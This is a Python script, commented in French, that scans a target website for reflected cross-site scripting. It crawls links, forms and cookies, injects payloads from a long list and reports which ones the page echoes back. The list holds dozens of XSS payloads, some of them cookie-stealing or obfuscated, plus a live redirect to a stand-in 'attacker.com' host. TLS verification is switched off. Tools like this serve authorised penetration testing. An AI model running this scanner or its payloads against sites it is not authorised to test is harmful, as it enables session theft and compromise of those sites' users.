import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from pprint import pprint

# Payloads XSS pour tester la vulnérabilité
XSS_PAYLOADS = [
    # Basic script tags
    "<script>alert('XSS')</script>",
    "<script>alert(document.cookie)</script>",
    "<script>prompt('XSS')</script>",
    "<script>confirm('XSS')</script>",
    "<script>document.location='http://attacker.com'</script>",

    #Décommenter les payloads suivants pour les tester
    
    # Event handlers
    # "<img src=x onerror=alert('XSS')>",
    # "<img src=x onerror=prompt('XSS')>",
    # "<img src=x onerror=confirm('XSS')>",
    # "<body onload=alert('XSS')>",
    # "<svg onload=alert('XSS')>",
    # "<svg/onload=prompt('XSS')>",
    # "<svg/onload=confirm('XSS')>",
    # "<input type='text' onfocus=alert('XSS')>",
    # "<input type='text' onmouseover=alert('XSS')>",
    # "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
    # "<iframe onload=alert('XSS')></iframe>",
    # "<video onerror=alert('XSS')><source /></video>",
    # "<audio onerror=alert('XSS')><source /></audio>",
    # "<details ontoggle=alert('XSS')>",

    # # Tag variations
    # "<ScRiPt>alert('XSS')</ScRiPt>",
    # "<sCrIpT>alert('XSS')</sCrIpT>",
    # "<IMG SRC=x onerror=alert('XSS')>",
    # "<svg/OnLoAd=alert('XSS')>",
    # "<BODY ONLOAD=alert('XSS')>",

    # # Encoding and obfuscation
    # "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    # "&#60;script&#62;alert('XSS')&#60;/script&#62;",
    # "javascript:alert('XSS')",
    # "javascri\pt:alert('XSS')",
    # "jav&#x09;ascript:alert('XSS')",
    # "data:text/html,<script>alert('XSS')</script>",
    # "``;alert('XSS');//",
    # "';alert('XSS');//",
    # "\"';alert('XSS');//",
    # "\\';alert('XSS');//",
    # "\\\"';alert('XSS');//",
    # "';!--\"<XSS>=&{()}",
    # "'\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    # "'\\x3cimg src=x onerror=alert(1)\\x3e",
    # "\"\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
    # "\"\\x3cimg src=x onerror=alert(1)\\x3e",

    # # Context-specific payloads
    # "'><script>alert(1)</script>",
    # "'><img src=x onerror=alert(1)>",
    # "\"<script>alert(1)</script>",
    # "\"<img src=x onerror=alert(1)>",
    # "</title><script>alert(1)</script>",
    # "</style><script>alert(1)</script>",
    # "</script><script>alert('XSS')</script>",
    # "<script>\\x3c/script><script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",
    # "<script>\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e\\x3c!--\\x3e<script>alert('XSS')</script>",

    # # Data URLs
    # "data:text/html,<script>alert('XSS')</script>",
    # "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=",
    # "data:text/html;charset=utf-8,%3Cscript%3Ealert('XSS')%3C/script%3E",

    # # Unicode escapes
    # "<script>\\u0061lert('XSS')</script>",
    # "<img src=x onerror=\\u0061lert('XSS')>",
    # "<svg/onload=\\u0061lert('XSS')>",
    # "<body onload=\\u0061lert('XSS')>",

    # # Null bytes
    # "<script>alert(\\x00'XSS')</script>",
    # "<img src=x onerror=alert(\\x00'XSS')>",
    # "<svg/onload=alert(\\x00'XSS')>",
    # "<body onload=alert(\\x00'XSS')>",

    # # Comment tags
    # "<script>alert('XSS')</script>",
    # "<script>alert('XSS')</script>",
    # "<script>alert('XSS')</script>",

    # # Input tag tricks
    # "<input type='image' src='x' onerror='alert(\"XSS\")'>",
    # "<input type='button' onclick='alert(\"XSS\")'>",
    # "<input type='text' value='XSS' onfocus='alert(document.cookie)'>",

    # # Meta tag refresh
    # "<meta http-equiv='refresh' content='0;url=javascript:alert(\"XSS\");'>",
    # "<meta http-equiv='refresh' content='0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",

    # # Iframe tricks
    # "<iframe src='javascript:alert(\"XSS\");'></iframe>",
    # "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='></iframe>",

    # # Style tag tricks
    # "<style>body {background-image: url(\"javascript:alert('XSS')\");}</style>",
    # "<style>body {background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==);}</style>",

    # # Object tag tricks
    # "<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='></object>",
    # "<object data='javascript:alert(\"XSS\");'></object>",

    # # Embed tag tricks
    # "<embed src='javascript:alert(\"XSS\");'>",
    # "<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4='>",

    # # Video tag tricks
    # "<video><source onerror='alert(\"XSS\")'></video>",
    # "<video src='x' onerror='alert(\"XSS\")'></video>",

    # # Audio tag tricks
    # "<audio><source onerror='alert(\"XSS\")'></audio>",
    # "<audio src='x' onerror='alert(\"XSS\")'></audio>",

    # # Details tag tricks
    # "<details ontoggle='alert(\"XSS\")'></details>",

    # # Iframe tag tricks
    # "<iframe srcdoc='&lt;script&gt;alert(\"XSS\")&lt;/script&gt;'></iframe>",

    # # Input tag focus tricks
    # "<input type='text' onfocus='alert(\"XSS\")' autofocus>",

    # # SVG Image tricks
    # "<svg><image href='javascript:alert(\"XSS\")' /></svg>",
]



def find_xss_in_urls(target, session=None):
    """Recherche des paramètres potentiellement vulnérables à XSS dans les URLs du site."""
    if not session:
        session = requests.Session()
    session.verify = False
    try:
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        
        detected_params = []
        for link in soup.find_all('a', href=True):
            url = link['href']
            if "?" in url and "=" in url:
                full_url = urljoin(target, url)
                parsed_url = urlparse(full_url)
                params = parsed_url.query.split("&")
                for param in params:
                    name = param.split("=")[0]
                    print(f"[!!!] {full_url} - {name}")
                    detected_params.append({"url": full_url, "param": name})
        
        return detected_params
    except requests.exceptions.RequestException as e:
        # print(f"[!][!][XXX] Erreur lors de la requête : {e}\n")
        return []

def find_xss_in_forms(target, session=None):
    """Recherche des formulaires pouvant être vulnérables à XSS."""
    print("[!]~] Recherche des formulaires...")
    if not session:
        session = requests.Session()
    session.verify = False
    try:
        response = session.get(target, timeout=5)
        soup = BeautifulSoup(response.text, 'lxml')
        
        detected_forms = []
        for form in soup.find_all('form'):
            action = form.attrs.get("action", "").strip()
            method = form.attrs.get("method", "get").lower()
            inputs = {input_tag.attrs.get("name"): input_tag.attrs.get("value", "") for input_tag in form.find_all("input") if input_tag.attrs.get("name")}
            
            full_action_url = urljoin(target, action) if action else target
            detected_forms.append({"action": full_action_url, "method": method, "inputs": inputs})
            print(f"[!!!] {full_action_url} - {inputs}")
        
        return detected_forms
    except requests.exceptions.RequestException as e:
        # print(f"[!][!][XXX] Erreur lors de la requête : {e}\n")
        return []

def find_xss_in_cookies(target, session=None):
    """Recherche des cookies susceptibles d'être vulnérables à XSS."""
    print("[!]~] Recherche des cookies...")
    if not session:
        session = requests.Session()
    session.verify = False
    try:
        response = session.get(target, timeout=5)
        cookies = response.cookies.get_dict()
        print(f"[!!!] Cookies : {cookies}")
        return cookies
    except requests.exceptions.RequestException as e:
        # print(f"[!][!][XXX] Erreur lors de la requête : {e}\n")
        return {}

def test_xss(target_url, param, method="get", session=None):
    """Teste l'injection de payloads XSS sur un paramètre donné."""
    print(f"[!]~] Test XSS sur {target_url}...")
    if not session:
        session = requests.Session()
    session.verify = False
    for payload in XSS_PAYLOADS:
        test_url = f"{target_url}&{param}={payload}" if "?" in target_url else f"{target_url}?{param}={payload}"
        try:
            if method == "get":
                response = session.get(test_url, timeout=5)
            else:
                response = session.post(target_url, data={param: payload}, timeout=5)
            response_text = response.text.lower()
            if payload.lower() in response_text:
                print(f" XSS détectée sur {test_url} avec le payload : {payload}")
                print(f"[!!!]🔥 XSS détectée sur {test_url} !")
                return {"url": test_url, "payload": payload}
        except requests.exceptions.RequestException as e:
            # print(f"[!][!][XXX] Erreur lors de la requête XSS : {e}")
            pass
    return None

def scan_xss(target, formated_target, session=None):
    """Effectue un scan XSS sur le site."""
    print(f"\n\t==============Scan XSS sur -->{formated_target}<--  ==============\n")
    results = {"urls": [], "forms": [], "cookies": []}
    
    # 1️⃣ Tester les XSS dans les URLs
    urls_with_params = find_xss_in_urls(target, session)
    if urls_with_params:
        print("[!]~] Test XSS sur les URLs...")
        for item in urls_with_params:
            result = test_xss(item["url"], item["param"], "get", session)
            if result:
                results["urls"].append(result)
    
    # 2️⃣ Tester les XSS dans les formulaires
    forms_with_inputs = find_xss_in_forms(target, session)
    if forms_with_inputs:
        print("\n[!]~] Test XSS sur les formulaires...")
        for form in forms_with_inputs:
            action = form["action"]
            method = form["method"]
            for input_name, input_value in form["inputs"].items():
                result = test_xss(action, input_name, method, session)
                if result:
                    results["forms"].append(result)
                    
    # 3️⃣ Tester les XSS dans les cookies
    cookies = find_xss_in_cookies(target, session)
    if cookies:
        print("\n[!]~] Test XSS sur les cookies...")
        for cookie_name, cookie_value in cookies.items():
            result = test_xss(target, cookie_name, "get", session)
            if result:
                results["cookies"].append(result)
    
    
    print("[!]~]Résultats du scan XSS :")
    print("[!][~]")
    print("[!][~]")
    pprint(results)
    print("\n✅ Scan XSS terminé.\n")
    return results